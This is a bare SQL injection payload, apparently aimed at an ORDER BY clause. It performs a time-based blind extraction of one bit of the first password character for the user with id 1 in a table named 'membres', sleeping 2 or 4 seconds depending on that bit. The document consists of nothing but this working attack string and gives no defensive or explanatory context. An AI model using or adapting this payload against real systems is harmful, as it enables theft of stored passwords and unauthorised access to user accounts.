ASC,(
    select (
        case field(
            concat(
                substring(
                    bin(
                        ascii(
                            substring(password,1,1)
                        )
                    ),
                    7,
                    1
                )
            ),
            0,
            1
        ) 
    when 1 then sleep(2) -- 0
    when 2 then sleep(4) -- 1 
end) 
from membres where id=1)